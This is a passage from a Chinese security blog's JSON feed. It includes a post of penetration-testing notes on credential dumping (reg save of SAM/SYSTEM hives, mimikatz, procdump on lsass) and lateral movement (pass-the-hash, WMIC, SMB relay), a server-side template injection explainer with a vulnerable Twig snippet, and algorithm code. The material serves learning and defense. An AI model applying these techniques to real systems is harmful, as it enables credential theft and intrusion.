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\" alt=\"reg save HKl_m SYSTEM c: windows temp Sys. hiv  • ndows temp Sam. hiv  reg save HKLm SYSTEM c: \"></p>\n<p>而后使用mimikatz进行明文密码的抓取</p>\n<p><strong>动态抓取方式：</strong></p>\n<p><strong>使用<strong><strong>procdump.exe</strong></strong>对<strong><strong>lsas.exe</strong></strong>的内存<strong><strong>dump</strong></strong>到本地。其中<strong><strong>lsass.exe</strong></strong>用于进行密码验证因此会存有明文密码</strong></p>\n<p><strong>使用<strong><strong>sqldumper.exe</strong></strong>（<strong><strong>mssql</strong></strong>安装目录下提取出来的工具），****sekurlsa::minidump</strong></p>\n<p><strong>mimikatz<strong><strong>进行</strong></strong>debug<strong><strong>从而进行</strong></strong>NTLM****哈希的抓取：</strong></p>\n<p><strong>而后进行分析</strong></p>\n<p><strong>横向移动：</strong></p>\n<ul>\n<li><p><strong>信息收集：</strong></p>\n</li>\n<li><ul>\n<li><strong>内网结构，键盘记录，每个主机上各种密码收集，构造字典</strong></li>\n</ul>\n</li>\n<li><p><strong>移动方法：</strong></p>\n</li>\n<li><ul>\n<li><strong>弱口令</strong></li>\n<li><strong>高危内网服务</strong></li>\n<li><strong>web</strong></li>\n<li><strong>bloodhound****一把梭</strong></li>\n</ul>\n</li>\n<li><p>利用猕猴桃获得其他主机的凭证，在域内进行横向的转移</p>\n</li>\n<li><p>WMIC工具能够进行远程命令执行</p>\n</li>\n<li><p>WCE工具能够进行远程哈希注入</p>\n</li>\n<li><p>MSF的PSEXEC模块能够进行哈希传递</p>\n</li>\n<li><p>netsh能够进行防火墙的规则设置</p>\n</li>\n<li><p>psexec哈希传递</p>\n</li>\n<li><p>smb重放（攻击者进行中间人攻击，由于SMB认证是基于挑战响应机制的，因此作为中间人可以直接转发客户机的challenge值），远程计划任务</p>\n</li>\n</ul>\n<p><strong>端口扫描：</strong></p>\n<p><strong>nmap****：</strong></p>\n<p>-sP 使用ping扫描</p>\n<p>-PE ICMP扫描</p>\n<p>-sS 半开式扫描</p>\n<p><strong>漏洞扫描工具</strong></p>\n<ul>\n<li><strong>AWVS<strong><strong>，</strong></strong>APPSCAN<strong><strong>，</strong></strong>nessus</strong></li>\n<li><strong>nmap     –script</strong> <strong>选择脚本</strong></li>\n</ul>\n<p><strong>内网流量代理工具</strong></p>\n<ul>\n<li><p><strong>流量代理</strong></p>\n</li>\n<li><ul>\n<li><strong>frp</strong></li>\n<li><strong>nps</strong></li>\n<li><strong>venom</strong></li>\n</ul>\n</li>\n<li><p><strong>本地转发</strong></p>\n</li>\n<li><ul>\n<li><strong>windows<strong><strong>：</strong></strong>netsh</strong></li>\n<li><strong>linux<strong><strong>：</strong></strong>ssh</strong></li>\n</ul>\n</li>\n</ul>\n<p><strong>DNS<strong><strong>相关内容</strong></strong>：</strong></p>\n<ul>\n<li><p><strong>DNS</strong> <strong>A记录****：即用来指定主机名（域名）对应的IP地址记录，用户可以将该域名下的网站服务器指向到自己的web</strong> <strong>server上****。</strong></p>\n</li>\n<li><p><strong>CNAME记录：别名<strong><strong>解析</strong></strong>，由主机名到主机名到映射，当需要将域名指向另一个域名，再由另一个域名提供IP地址时需要CNAME记录，包括CDN，企业邮箱等操作。</strong></p>\n</li>\n<li><p><strong>A记录和CNAME记录之间的区别：CNAME可以实现一台服务器上搭载多个网站，也就是多个域名解析到一个主机名上，该主机名对应一条A记录，用于解析域名到IP之间的记录，当主机需要更换IP时，只修改该A记录即可</strong></p>\n</li>\n<li><p><strong>域名与IP之间的关系：</strong></p>\n</li>\n<li><ul>\n<li><strong>一个域名可以对应多个IP，用于实现类似负载均衡。一个域名设置多个dns服务器进行解析，同一个域名的不同解析会指向不同的地址，这样应答快的dns现解析，这样就可以保证最快定向到指定的网站空间去。</strong></li>\n<li><strong>一个IP也可以对应多个域名：例如CNAME记录就是这类方式。将不通过的域名通过CNAME映射到同一个域名上去。</strong></li>\n</ul>\n</li>\n</ul>\n<p><strong>http相关内容：</strong></p>\n<ul>\n<li><p><strong>Accept字段****：在http请求数据包中，用于告知服务器自己接受什么样的数据</strong></p>\n</li>\n<li><ul>\n<li><strong>Text</strong><strong>/html****，</strong> <strong>image/jpeg</strong></li>\n</ul>\n</li>\n<li><p><strong>Content-Type****：表名实体主体的文件类型（文件上传绕过可以尝试该方式）</strong></p>\n</li>\n<li><p><strong>Referer：用于告知服务器，客户机是从哪个资源来访问服务器的</strong></p>\n</li>\n<li><p><strong>X</strong><strong>-Forward-For****：与Referer不同之处在于其填写的内容是IP，而XFF填写的内容是上一个访问的资源地址。在进行编程时选择使用remote</strong> <strong>addr则得到的是真实IP****，即进行握手时的IP。而XFF是可以进行伪造的。当使用类似Nginx进行反向代理时，remote</strong> <strong>addr得到的是代理服务器的IP****，因此需要填写XFF指向真正的外部用户。当然真正的web服务器此时需要禁止对外提供服务。</strong></p>\n</li>\n</ul>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/06/mo-ban-zhu-ru/",
            "url": "https://alazymechnaic.github.io/2024/03/06/mo-ban-zhu-ru/",
            "title": "模板注入",
            "date_published": "2024-03-06T11:46:59.000Z",
            "content_html": "<h1 id=\"模板注入\"><a href=\"#模板注入\" class=\"headerlink\" title=\"模板注入\"></a>模板注入</h1><h2 id=\"模板注入原理\"><a href=\"#模板注入原理\" class=\"headerlink\" title=\"模板注入原理\"></a>模板注入原理</h2><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>\n<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，<a href=\"https://so.csdn.net/so/search?q=%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E&amp;spm=1001.2101.3001.7020\">模板引擎</a>在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>\n<h2 id=\"模板注入基本格式\"><a href=\"#模板注入基本格式\" class=\"headerlink\" title=\"模板注入基本格式\"></a>模板注入基本格式</h2><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>    <span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-title function_ invoke__\">dirname</span>(<span class=\"hljs-keyword\">__FILE__</span>).<span class=\"hljs-string\">'/../lib/Twig/Autoloader.php'</span>);<br>    <span class=\"hljs-title class_\">Twig_Autoloader</span>::<span class=\"hljs-title function_ invoke__\">register</span>(<span class=\"hljs-literal\">true</span>);<br>    <span class=\"hljs-variable\">$twig</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Twig_Environment</span>(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Twig_Loader_String</span>());<br>    <span class=\"hljs-variable\">$output</span> = <span class=\"hljs-variable\">$twig</span>-&gt;<span class=\"hljs-title function_ invoke__\">render</span>(<span class=\"hljs-string\">\"Hello {{name}}\"</span>, <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">\"name\"</span> =&gt;<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">\"name\"</span>]));  <span class=\"hljs-comment\">// 将用户输入作为模版变量的值</span><br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$output</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>上面的形式并不会造成XSS，但是会造成模板注入问题，会对name字段的内容进行渲染。本质是模板引擎将程序的输入作为需要解析的代码进行处理，那么在处理的过程中用户就可以尝试调用类中的对象。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403061952251.png\" alt=\"image-20240306195239155\"></p>\n<p><a href=\"https://blog.csdn.net/huangyongkang666/article/details/123628875\">https://blog.csdn.net/huangyongkang666/article/details/123628875</a></p>\n<p>基本思路是使用Python的魔术方法</p>\n<figure class=\"highlight markdown\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs markdown\"><span class=\"hljs-strong\">__dict__</span> 保存类实例或对象实例的属性变量键值对字典<br><span class=\"hljs-strong\">__class__</span>  返回类型所属的对象<br><span class=\"hljs-strong\">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class=\"hljs-strong\">__bases__</span>   返回该对象所继承的基类<br>// <span class=\"hljs-strong\">__base__</span>和<span class=\"hljs-strong\">__mro__</span>都是用来寻找基类的<br><br><span class=\"hljs-strong\">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class=\"hljs-strong\">__init__</span>  类的初始化方法<br><span class=\"hljs-strong\">__globals__</span>  对包含函数全局变量的字典的引用<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "web"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/06/wang-an-xuan-shou-de-suan-fa-ji-chu/",
            "url": "https://alazymechnaic.github.io/2024/03/06/wang-an-xuan-shou-de-suan-fa-ji-chu/",
            "title": "网安选手的算法基础",
            "date_published": "2024-03-06T06:47:54.000Z",
            "content_html": "<h2 id=\"链\"><a href=\"#链\" class=\"headerlink\" title=\"链\"></a>链</h2><h3 id=\"单链表逆置\"><a href=\"#单链表逆置\" class=\"headerlink\" title=\"单链表逆置\"></a>单链表逆置</h3><h3 id=\"二分查找\"><a href=\"#二分查找\" class=\"headerlink\" title=\"二分查找\"></a>二分查找</h3><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">searchInsert</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span>* nums, <span class=\"hljs-type\">int</span> numsSize, <span class=\"hljs-type\">int</span> target)</span>{<br>    <span class=\"hljs-type\">int</span> left=<span class=\"hljs-number\">0</span>,right=numsSize<span class=\"hljs-number\">-1</span>;<br>    <span class=\"hljs-keyword\">while</span>(left&lt;=right){ <span class=\"hljs-comment\">// 这里注意是存在等于号</span><br>        <span class=\"hljs-type\">int</span> mid=(left+right)/<span class=\"hljs-number\">2</span>;<br>        <span class=\"hljs-keyword\">if</span>(nums[mid]==target)<br>            <span class=\"hljs-keyword\">return</span> mid;<br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(nums[mid]&gt;target)<br>            right=mid<span class=\"hljs-number\">-1</span>; <br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(nums[mid]&lt;target)<br>            left=mid+<span class=\"hljs-number\">1</span>;<br>    }<br>    <span class=\"hljs-keyword\">return</span> left; <span class=\"hljs-comment\">// 这里注意是left</span><br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"树\"><a href=\"#树\" class=\"headerlink\" title=\"树\"></a>树</h2><h3 id=\"二叉树的中序遍历\"><a href=\"#二叉树的中序遍历\" class=\"headerlink\" title=\"二叉树的中序遍历\"></a>二叉树的中序遍历</h3><h4 id=\"递归方法\"><a href=\"#递归方法\" class=\"headerlink\" title=\"递归方法\"></a>递归方法</h4><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">mid_show</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> TreeNode* root, <span class=\"hljs-type\">int</span>* returnSize, <span class=\"hljs-type\">int</span> *returnNum)</span>{<br>    <span class=\"hljs-keyword\">if</span>(root == <span class=\"hljs-literal\">NULL</span>)<br>        <span class=\"hljs-keyword\">return</span>;<br>   \t<span class=\"hljs-string\">'''</span><br>        前中后序的遍历按照下面的方式换顺序即可<br>    <span class=\"hljs-string\">'''</span><br>    mid_show(root-&gt;left, returnSize, returnNum);<br>    returnNum[(*returnSize)++] = root-&gt;val;<br>    mid_show(root-&gt;right, returnSize, returnNum);<br>}<br><span class=\"hljs-type\">int</span>* <span class=\"hljs-title function_\">inorderTraversal</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> TreeNode* root, <span class=\"hljs-type\">int</span>* returnSize)</span><br>{<br>    <span class=\"hljs-comment\">//树中节点数目在范围 [0, 100] 内</span><br>    *returnSize = <span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-type\">int</span> *returnNum = (<span class=\"hljs-type\">int</span>*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(<span class=\"hljs-type\">int</span>)*<span class=\"hljs-number\">101</span>);<br>    mid_show(root,returnSize,returnNum);<br>    <span class=\"hljs-keyword\">return</span> returnNum;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"非递归方法\"><a href=\"#非递归方法\" class=\"headerlink\" title=\"非递归方法\"></a>非递归方法</h4><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">int</span>* <span class=\"hljs-title function_\">inorderTraversal</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> TreeNode* root, <span class=\"hljs-type\">int</span>* returnSize)</span> {<br>    *returnSize = <span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-type\">int</span>* res = <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(<span class=\"hljs-type\">int</span>) * <span class=\"hljs-number\">501</span>); <span class=\"hljs-comment\">// 返回结果</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">TreeNode</span>** <span class=\"hljs-title\">stk</span> =</span> <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(<span class=\"hljs-keyword\">struct</span> TreeNode*) * <span class=\"hljs-number\">501</span>); <span class=\"hljs-comment\">// 生成一个栈</span><br>    <span class=\"hljs-type\">int</span> top = <span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">while</span> (root != <span class=\"hljs-literal\">NULL</span> || top &gt; <span class=\"hljs-number\">0</span>) {<br>        <span class=\"hljs-keyword\">while</span> (root != <span class=\"hljs-literal\">NULL</span>) {<br>            stk[top++] = root;<br>            root = root-&gt;left;<br>        }<br>        root = stk[--top];<br>        res[(*returnSize)++] = root-&gt;val;<br>        root = root-&gt;right;<br>    }<br>    <span class=\"hljs-keyword\">return</span> res;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"二叉树的最大深度\"><a href=\"#二叉树的最大深度\" class=\"headerlink\" title=\"二叉树的最大深度\"></a>二叉树的最大深度</h3><h4 id=\"递归方法-1\"><a href=\"#递归方法-1\" class=\"headerlink\" title=\"递归方法\"></a>递归方法</h4><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">maxDepth</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> TreeNode *root)</span> {<br>    <span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\">    \t对于每个节点来说，该结点的最大高度等于其左右子树的最大高度之一</span><br><span class=\"hljs-comment\">    */</span><br>    <span class=\"hljs-keyword\">if</span> (root == <span class=\"hljs-literal\">NULL</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">return</span> fmax(maxDepth(root-&gt;left), maxDepth(root-&gt;right)) + <span class=\"hljs-number\">1</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"图\"><a href=\"#图\" class=\"headerlink\" title=\"图\"></a>图</h2>",
            "tags": [
                "算法"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/05/ruan-jian-fen-xi-ji-zhu/",
            "url": "https://alazymechnaic.github.io/2024/03/05/ruan-jian-fen-xi-ji-zhu/",
            "title": "软件分析技术",
            "date_published": "2024-03-05T12:14:13.000Z",
            "content_html": "<h3 id=\"利用软件分析进返混淆，返平坦化\"><a href=\"#利用软件分析进返混淆，返平坦化\" class=\"headerlink\" title=\"利用软件分析进返混淆，返平坦化\"></a>利用软件分析进返混淆，返平坦化</h3><p><a href=\"https://www.52pojie.cn/thread-1386178-1-1.html\">https://www.52pojie.cn/thread-1386178-1-1.html</a></p>\n<p><a href=\"https://www.52pojie.cn/thread-1353006-1-1.html\">https://www.52pojie.cn/thread-1353006-1-1.html</a></p>\n<p>capstone 到 llvm ir</p>\n<p><a href=\"https://www.52pojie.cn/thread-1436845-1-1.html\">https://www.52pojie.cn/thread-1436845-1-1.html</a></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/zhi-zhen-fen-xi-ji-zhu/",
            "url": "https://alazymechnaic.github.io/2024/03/04/zhi-zhen-fen-xi-ji-zhu/",
            "title": "指针分析技术",
            "date_published": "2024-03-04T07:42:31.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/windows-lou-dong-li-yong/",
            "url": "https://alazymechnaic.github.io/2024/03/04/windows-lou-dong-li-yong/",
            "title": "Windows漏洞利用",
            "date_published": "2024-03-04T07:01:14.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/docker-ming-ling-ji-chu/",
            "url": "https://alazymechnaic.github.io/2024/03/04/docker-ming-ling-ji-chu/",
